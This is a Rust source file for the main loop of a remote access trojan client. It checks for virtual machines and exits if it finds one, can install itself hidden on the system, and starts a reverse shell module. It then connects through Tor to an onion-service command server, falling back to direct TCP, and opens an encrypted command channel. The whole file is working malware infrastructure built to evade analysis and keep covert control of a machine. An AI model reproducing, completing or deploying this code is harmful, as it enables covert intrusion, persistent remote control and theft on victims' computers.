// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
// #![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::time::Duration;
use winapi::um::winuser::SetProcessDPIAware;

pub mod features;
pub mod service;
pub mod handler;

use tokio::{net::TcpStream, sync::oneshot, time::sleep};
use arti_client::{TorClient, TorClientConfig, StreamPrefs};
use arti_client::config::BoolOrAuto;
use common::{connection::Connection, connection::StreamTrait, packets::*};
use futures::StreamExt;

use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;

use features::encryption;

static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);

static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() {
    // Log arti's internal tracing events (circuit building, bootstrap, HSDir fetches, etc.)
    // to stdout.  Filter: show arti/tor crates at DEBUG, everything else at WARN.
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::new(
                "warn,arti_client=info,tor_circmgr=info,tor_dirmgr=info"
            )
        )
        .with_target(true)
        .with_thread_ids(false)
        .with_file(false)
        .init();

    let config = service::config::get_config();

    if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
        std::process::exit(0);
    }

    let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
    
    {
        tray_icon.lock().unwrap().set_unattended(config.unattended_mode);
        tray_icon.lock().unwrap().show();
    }

    unsafe {
        // FIX REMOTE DESKTOP DPI ISSUES
        SetProcessDPIAware();
    }

    {
        // MUTEX SERVICE
        let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
    }

    if config.install {
        service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
    }


    let tor_client = if config.use_tor {
        println!("Initializing Tor client...");
        let mut tor_config_builder = TorClientConfig::builder();
        tor_config_builder.override_net_params().insert("guard-n-primary-guards".to_string(), 6);
        let tor_config = tor_config_builder.build().expect("Failed to build TorClientConfig");

        let client = loop {
            match TorClient::builder()
                .config(tor_config.clone())
                .create_unbootstrapped()
            {
                Ok(unbootstrapped) => {
                    let mut events = unbootstrapped.bootstrap_events();
                    tokio::spawn(async move {
                        while let Some(status) = events.next().await {
                            println!(
                                "[Tor bootstrap] {:.0}%",
                                status.as_frac() * 100.0
                            );
                        }
                    });

                    match unbootstrapped.bootstrap().await {
                        Ok(()) => {
                            println!("[Tor] Bootstrap complete.");
                            break unbootstrapped;
                        }
                        Err(e) => {
                            eprintln!("[Tor] Bootstrap failed: {}. Retrying in 15 seconds...", e);
                            sleep(Duration::from_secs(15)).await;
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[Tor] Failed to create client: {}. Retrying in 15 seconds...", e);
                    sleep(Duration::from_secs(15)).await;
                }
            }
        };

        println!("[Tor] Waiting 30 seconds for onion circuit pool to warm up...");
        sleep(Duration::from_secs(30)).await;

        Some(client)
    } else {
        None
    };

    // Main connection loop
    loop {
        let tray_icon_clone = tray_icon.clone();
        // Connect to server phase
        println!("Connecting to server...");

        {
            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connecting...");
        }
        
        let stream = if config.use_tor && tor_client.is_some() {
            let tor = tor_client.as_ref().unwrap();
            let port = config.port.parse::<u16>().unwrap_or(1337);
            // Onion service connections are disabled by default in arti-client.
            // StreamPrefs must explicitly enable them or .onion addresses will be rejected.
            let mut prefs = StreamPrefs::new();
            prefs.connect_to_onion_services(BoolOrAuto::Explicit(true));

            static TOR_FAIL_COUNT: std::sync::atomic::AtomicU32 =
                std::sync::atomic::AtomicU32::new(0);

            match tor.connect_with_prefs((config.tor_address.clone(), port), &prefs).await {
                Ok(s) => {
                    TOR_FAIL_COUNT.store(0, std::sync::atomic::Ordering::Relaxed);
                    println!("[Tor] Connected to onion service successfully.");
                    Box::new(s) as Box<dyn StreamTrait + Unpin + Send>
                }
                Err(e) => {
                    let fails = TOR_FAIL_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
                    eprintln!(
                        "[Tor] Connection attempt {}/3 to {}:{} failed: {}",
                        fails, config.tor_address, port, e
                    );

                    if fails < 3 {
                        println!("[Tor] Retrying in 5 seconds...");
                        sleep(Duration::from_secs(5)).await;
                        continue;
                    }

                    println!(
                        "[Tor] Giving up on onion connection after {} attempts. Falling back to direct TCP at {}:{}...",
                        fails, config.ip, config.port
                    );
                    TOR_FAIL_COUNT.store(0, std::sync::atomic::Ordering::Relaxed);
                    match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
                        Ok(socket) => {
                            println!("[TCP] Connected directly.");
                            Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>
                        }
                        Err(e) => {
                            eprintln!("[TCP] Direct connection also failed: {}. Retrying in 5 seconds...", e);
                            sleep(Duration::from_secs(5)).await;
                            continue;
                        }
                    }
                }
            }
        } else {
            if config.use_tor {
                println!("Tor client not available, attempting direct connection to {}:{}", config.ip, config.port);
            }
            match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
                Ok(socket) => Box::new(socket) as Box<dyn StreamTrait + Unpin + Send>,
                Err(e) => {
                    println!("Connection failed: {}. Retrying in 5 seconds...", e);
                    sleep(Duration::from_secs(5)).await;
                    continue;
                }
            }
        };

        {
            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
        }

        // Encryption handshake phase
        println!("Connected to server. Performing encryption handshake...");
        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new_from_boxed(stream);
        
        let encryption_result = encryption::perform_encryption_handshake(connection).await;
        
        match encryption_result {
            Ok((encryption_state, reader, writer)) => {
                // println!("Encryption handshake successful!");
                // Setup communication channel between reader and writer
                let (tx, rx) = oneshot::channel::<()>();

                // Start writer task
                let write_task = tokio::spawn(
                    handler::writing_loop(
                        writer, 
                        rx, 
                        encryption_state.secret.clone(), 
                        encryption_state.nonce_generator_write
                    )
                );
                
                // Small delay to ensure writer is ready
                sleep(Duration::from_millis(100)).await;
                
                // Start reader task (will block until connection ends)
                handler::reading_loop(
                    reader, 
                    tx, 
                    encryption_state.secret.clone(), 
                    encryption_state.nonce_generator_read
                ).await;
                
                // Wait for writer to complete
                if let Err(e) = write_task.await {
                    println!("Write task error: {}", e);
                }

                {
                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }
                
                // println!("Connection ended. Reconnecting in 5 seconds...");
                sleep(Duration::from_secs(5)).await;
            },
            Err(_) => {
                {
                    tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }

                // println!("Encryption handshake failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}